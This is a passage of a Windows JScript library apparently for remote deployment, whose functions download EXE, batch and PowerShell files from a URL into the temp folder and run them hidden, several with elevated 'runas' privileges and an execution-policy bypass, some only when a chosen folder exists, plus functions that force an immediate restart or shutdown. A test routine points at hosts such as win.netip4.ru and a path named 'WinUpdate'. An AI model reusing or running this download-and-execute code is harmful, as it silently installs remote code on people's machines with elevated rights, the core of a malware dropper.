	if(tempFolder === "") {
		return 1;
	}
	iFlag = UploadFilesFromInt(strFileNameExe, strURL, tempFolder);
	if(iFlag != 0) return 1;
	RunDownloadedExe03(tempFolder, strFileNameExe, constOpt);
	return 0;
}
/* ********************************************************
'
' ExeDownlRunIfChecked00( strURL, iTimeOut, strFileNameExe, constOpt, strFile, strFolder )
'
' This Script Downloads Exe file from strURL Path and
' Execute it with Script TimeOut in iTimeOut ms
' if strFile or strFolder is Present on Local Computer
'
' PARAMETERS:	strURL - URL Path to Download
'				iTimeOut - Wait to End Execution of the File
' 				strFileNameExe - Name of Exe File
'				constOpt - Options of Exe File
'				strFile is a Checked File. May be Empty String
'				strFolder is a checked Folder. Must Not be Empty
' RETURNS:		0 if Success Download and Run
'				1 if File or Folder is Checked
'				2 if Error Occur
'
' *********************************************************/
function ExeDownlRunIfChecked00(strURL, iTimeOut, strFileNameExe, constOpt, strFile, strFolder) {
	var iFlag, isFlag;
	var isFileEmpty, fso;
	// Set fso
	fso = new ActiveXObject("Scripting.FileSystemObject");
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if(strFolder === "" || tempFolder === "") {
		return 2;
	}
	// Check if File Empty
	if(strFile.length == 0) {
		isFileEmpty = 1;
	} else {
		isFileEmpty = 0;
	}
	isFlag = CheckIfFileOrFolderExist(strFile, strFolder);
	// Checck if File or Folder Exists
	if(isFileEmpty == 1 && isFlag < 2 || isFileEmpty == 0 && isFlag == 0) {
		return 1;
	} else {
		iFlag = UploadFilesFromInt(strFileNameExe, strURL, tempFolder);
		if(iFlag != 0) return 2;
		RunDownloadedExe01(tempFolder, strFileNameExe, constOpt, iTimeOut);
		return 0;
	}
}
/* ********************************************************
'
' ExeDownlRunIfChecked03( strURL, strFileNameExe, constOpt, strFile, strFolder )
'
' This Script Downloads Exe file from strURL Path and
' Execute it with Curren Privileges
' if strFile or strFolder is Present on Local Computer
'
' PARAMETERS:	strURL - URL Path to Download
' 				strFileNameExe - Name of Exe File
'				constOpt - Options of Exe File
'				strFile is a Checked File. May be Empty String
'				strFolder is a checked Folder. Must Not be Empty
' RETURNS:		0 if Success Download and Run
'				1 if File or Folder is Checked
'				2 if Error Occur
'
' *********************************************************/
function ExeDownlRunIfChecked03(strURL, strFileNameExe, constOpt, strFile, strFolder) {
	var iFlag, isFlag;
	var isFileEmpty, fso;
	// Set fso
	fso = new ActiveXObject("Scripting.FileSystemObject");
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if(strFolder === "" || tempFolder === "") {
		return 2;
	}
	// Check if File Empty
	if(strFile.length == 0) {
		isFileEmpty = 1;
	} else {
		isFileEmpty = 0;
	}
	isFlag = CheckIfFileOrFolderExist(strFile, strFolder);
	// Checck if File or Folder Exists
	if(isFileEmpty == 1 && isFlag < 2 || isFileEmpty == 0 && isFlag == 0) {
		return 1;
	} else {
		iFlag = UploadFilesFromInt(strFileNameExe, strURL, tempFolder);
		if(iFlag != 0) return 2;
		RunDownloadedExe03(tempFolder, strFileNameExe, constOpt);
		return 0;
	}
}
/******************************************************************************
'
' RunDownloadedCMD01( strPath, strCMD, intTimeOut )
' This Function Run Hidden a strCMD File
' with Command "cmd /c " & strPath & "\" & strCMD
'
' PARAMETERS:   strPath -- The Path to strCMD
'               strVBS -- a CMD File with instructions
'               (Windows Command Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/
function RunDownloadedCMD01(strPath, strCMD, intTimeOut) {
	var constRun_CMD, constOpt;
	// Define Windows Scripts Options
	constRun_CMD = "/c ";
	var strValue, shApp, fso, wsh, envProc, pathCMD;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	fso = new ActiveXObject("Scripting.FileSystemObject");
	wsh = new ActiveXObject("WScript.Shell");
	envProc = wsh.Environment("PROCESS");
	pathCMD = envProc("SystemRoot") + "\\System32";
	// Check Paths
	if(!fso.FileExists(pathCMD + "\\cmd.exe")) {
		return 1
	};
	if(!fso.FileExists(strPath + "\\" + strCMD)) {
		return 1
	};
	// Set Cscript Command Arguments
	strValue = constRun_CMD + "\"" + strPath + "\\" + strCMD + "\"";
	// Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
	shApp.ShellExecute(pathCMD + "\\cmd.exe", strValue, strPath, "runas", 0);
	//    setTimeout( DoNothing, intTimeOut );
	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
	WScript.Sleep(intTimeOut);
	return 0;
}
/******************************************************************************
'
' RunDownloadedCMD03( strPath, strCMD )
' This Function Run Hidden a strCMD File
' with Command "cmd /c " & strPath & "\" & strCMD
'
' PARAMETERS:   strPath -- The Path to strCMD
'               strVBS -- a CMD File with instructions
'               (Windows Command Shell)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/
function RunDownloadedCMD03(strPath, strCMD) {
	var constRun_CMD, constOpt;
	// Define Windows Scripts Options
	constRun_CMD = "/c ";
	var strValue, fso, wsh, envProc, pathCMD, comSpec;
	// Define ActiveX Object
	fso = new ActiveXObject("Scripting.FileSystemObject");
	wsh = new ActiveXObject("WScript.Shell");
	envProc = wsh.Environment("PROCESS");
	comSpec = envProc("COMSPEC");
	// Check Paths
	if(!fso.FileExists(comSpec)) {
		return 1
	};
	if(!fso.FileExists(strPath + "\\" + strCMD)) {
		return 1
	};
	// Set Cscript Command Arguments
	strValue = "\"" + comSpec + "\" " + constRun_CMD + "\"" + strPath + "\\" + strCMD + "\"";
	wsh.Run(strValue, 0, true);
	return 0;
}
/* ********************************************************
'
' CmdDownlRun01( strURL , strFileNameCMD, iTimeOut )
'
' This Script Downloads CMD file from strURL Path and
' Execute Hidden it with Script TimeOut in iTimeOut ms
'
' PARAMETERS:	strURL an URL Path to Download
' 				strFileNameCMD - Name of CMD File
'				iTimeOut is Wait to End Execution of the File
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
function CmdDownlRun01(strURL, strFileNameCMD, iTimeOut) {
	var iFlag;
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if(tempFolder === "") {
		return 1;
	}
	iFlag = UploadFilesFromInt(strFileNameCMD, strURL, tempFolder);
	if(iFlag != 0) return 1;
	RunDownloadedCMD01(tempFolder, strFileNameCMD, iTimeOut);
	return 0;
}
/* ********************************************************
'
' CmdDownlRun03( strURL , strFileNameCMD )
'
' This Script Downloads CMD file from strURL Path and
' Execute Hidden it with Current Privileges
'
' PARAMETERS:	strURL an URL Path to Download
' 				strFileNameCMD - Name of CMD File
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
function CmdDownlRun03(strURL, strFileNameCMD) {
	var iFlag;
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if(tempFolder === "") {
		return 1;
	}
	iFlag = UploadFilesFromInt(strFileNameCMD, strURL, tempFolder);
	if(iFlag != 0) return 1;
	RunDownloadedCMD03(tempFolder, strFileNameCMD);
	return 0;
}
/******************************************************************************
'
' RunDownloadedPwsh01( strPath, strPwsh, intTimeOut )
' This Function Run Hidden a strPwsh File
' with Command "powershell -NoProfile -ExecutionPolicy Bypass -File " & strPath & "\" & strPwsh
'
' PARAMETERS:   strPath -- The Path to strPwsh
'               strPwsh -- a PS1 File with instructions
'               (Windows PowerShell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/
function RunDownloadedPwsh01( strPath, strPwsh, intTimeOut ) {
	var constRun_Pwsh, constOpt;
	// Define Windows Scripts Options
	constRun_Pwsh = " -NoProfile -ExecutionPolicy Bypass -File ";
	var strValue, shApp, fso, wsh, envProc, pathCMD, aWPWSH;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	fso = new ActiveXObject("Scripting.FileSystemObject");
	wsh = new ActiveXObject("WScript.Shell");
	envProc = wsh.Environment("PROCESS");
	pathCMD = envProc("SystemRoot") + "\\System32";
	aWPWSH = pathCMD + "\\WindowsPowerShell\\v1.0\\powershell.exe";
	// Check Paths
	if(!fso.FileExists(aWPWSH)) {
		return 1
	};
	if(!fso.FileExists(strPath + "\\" + strPwsh)) {
		return 1
	};
	// Set Cscript Command Arguments
	strValue = constRun_Pwsh + "\"" + strPath + "\\" + strPwsh + "\"";
	// Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
	shApp.ShellExecute(aWPWSH, strValue, strPath, "runas", 0);
	//    setTimeout( DoNothing, intTimeOut );
	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
	WScript.Sleep(intTimeOut);
	return 0;
}
/******************************************************************************
'
' RunDownloadedPwsh03( strPath, strPwsh )
' This Function Run Hidden a strPwsh File
' with Command "powershell -NoProfile -ExecutionPolicy Bypass -File " & strPath & "\" & strPwsh
'
' PARAMETERS:   strPath -- The Path to strPwsh
'               strPwsh -- a PS1 File with instructions
'               (Windows PowerShell)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/
function RunDownloadedPwsh03( strPath, strPwsh ) {
	var constRun_Pwsh, constOpt;
	// Define Windows Scripts Options
	constRun_Pwsh = " -NoProfile -ExecutionPolicy Bypass -File ";
	var strValue, shApp, fso, wsh, envProc, pathCMD, aWPWSH;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	fso = new ActiveXObject("Scripting.FileSystemObject");
	wsh = new ActiveXObject("WScript.Shell");
	envProc = wsh.Environment("PROCESS");
	pathCMD = envProc("SystemRoot") + "\\System32";
	aWPWSH = pathCMD + "\\WindowsPowerShell\\v1.0\\powershell.exe";
	// Check Paths
	if(!fso.FileExists(aWPWSH)) {
		return 1
	};
	if(!fso.FileExists(strPath + "\\" + strPwsh)) {
		return 1
	};
	// Set Powershell Command Arguments
	strValue = "\"" + aWPWSH + "\" " + constRun_Pwsh + "\"" + strPath + "\\" + strPwsh + "\"";;
	wsh.Run(strValue, 0, true);
	return 0;
}
/***********************************************************
'
' CheckIfFileOrFolderExist
'
' The Script Checks If Folder or File on it is present
'
' PARAMETERS:	strFile - a checcking file
'		strFolder - a full path to checking folder
' RETURNS:	0 if File and Folder are Present
'			1 if Folder not File is Present
'			2 if File or Folder areh'n Present
' *********************************************************/
function CheckIfFileOrFolderExist(strFile, strFolder) {
	var fso, strFullName;
	fso = new ActiveXObject("Scripting.FileSystemObject");
	if(fso.FolderExists(strFolder)) {
		if(strFile.length == 0) {
			return 1;
		} else {
			strFullName = strFolder + "\\" + strFile;
			if(fso.FileExists(strFullName)) {
				return 0;
			} else {
				return 1;
			}
		}
	} else {
		return 2;
	}
}
/* ********************************************************
'
' RunRestartImmediately
'
' This Script Restart Current Computer Immediately

'
' PARAMETERS:	NONE
' RETURNS:	NONE
'
' *********************************************************/
function RunRestartImmediately() {
	var strValue, shApp, constOpt;
	var wsh, envProc;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	wsh = new ActiveXObject("WScript.Shell");
	// Define Process Environment Variable
	envProc = wsh.Environment("PROCESS");
	// Set Exe Command Arguments
	strValue = envProc("SystemRoot") + "\\System32\\shutdown.exe";
	constOpt = "/r /t 00";
	// Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
	shApp.ShellExecute(strValue, constOpt, "", "runas", 0);
	//    setTimeout( DoNothing, intTimeOut );
	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
}
/* ********************************************************
'
' RunStopImmediately
'
' This Script Stop Current Computer Immediately

'
' PARAMETERS:	NONE
' RETURNS:	NONE
'
' *********************************************************/
function RunStopImmediately() {
	var strValue, shApp, constOpt;
	var wsh, envProc;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	wsh = new ActiveXObject("WScript.Shell");
	// Define Process Environment Variable
	envProc = wsh.Environment("PROCESS");
	// Set Exe Command Arguments
	strValue = envProc("SystemRoot") + "\\System32\\shutdown.exe";
	constOpt = "/s /t 00";
	// Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
	shApp.ShellExecute(strValue, constOpt, "", "runas", 0);
	//    setTimeout( DoNothing, intTimeOut );
	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
}

/**********************************************************
 * WinCalcRun()
 * This Function will Run a Windows Calculator
 * Executable File on Windows Computer
 * 
 * PARAMETERS:	NONE
 * RETURN:		NONE
 *********************************************************/
function WinCalcRun(){

	// Define Variables
	var theFile="System32\\calc.exe";
	var tempFolder;
	var iTimeOut = 3; // 3 sec time out

	// Get and Check a System Root
	tempFolder = getSystemRoot();
	// tempFolder = "C:\\Windows"
		
	if(tempFolder === "") {
		return;
	}

	// Run a Payload
	RunDownloadedExe03(tempFolder, theFile, "", iTimeOut);
	return;
}

/* ********************************************************
'
' TEST Run echo Files
' This Script Tests all Echo files for Correct
' Download and Execute it
'
' *********************************************************/
function Test_Echo_Files() {
	var cmdEcho, exeEcho, wsfEcho, ahkEcho;
	var strURLPath, iTimeOut, strURLPath1;
	strURLPath = "http://win.netip4.ru/Scripts/LIB-TEST/";
	strURLPath1 = "http://file.netip4.ru/WinUpdate/InitialCommon/";
	cmdEcho = "echo.bat";
	exeEcho = "HelloWorld01.exe";
	wsfEcho = "echo.wsf";
	ahkEcho = "HelloWorld.ahk";
	iTimeOut = 30000; // 30 sec
	var iFlag;
	//iFlag = AhkDownlRun01( strURLPath1, ahkEcho, iTimeOut );
	//iFlag = ScriptDownlRun01( strURLPath, wsfEcho, iTimeOut );
	//iFlag = ExeDownlRun01( strURLPath, iTimeOut, exeEcho, "" );
	//iFlag = CmdDownlRun01( strURLPath, cmdEcho, iTimeOut );
	//iFlag = ScriptDownlRun03( strURLPath, wsfEcho );
	//iFlag = ExeDownlRun03( strURLPath, exeEcho, "" );
	//iFlag = CmdDownlRun03( strURLPath, cmdEcho );
	//iFlag = ScriptDownlRunIfChecked00( strURLPath, wsfEcho, iTimeOut, "", "C:\\WINDOWS\\System3");
	//iFlag = ExeDownlRunIfChecked00( strURLPath, iTimeOut, exeEcho, "", "", "C:\\WINDOWS\\System3");
	//iFlag = ScriptDownlRunIfChecked03( strURLPath, wsfEcho, "", "C:\\WINDOWS\\System3");
	//iFlag = ExeDownlRunIfChecked03( strURLPath, exeEcho, "", "", "C:\\WINDOWS\\System3");
}
//Test_Echo_Files();
// WinCalcRun();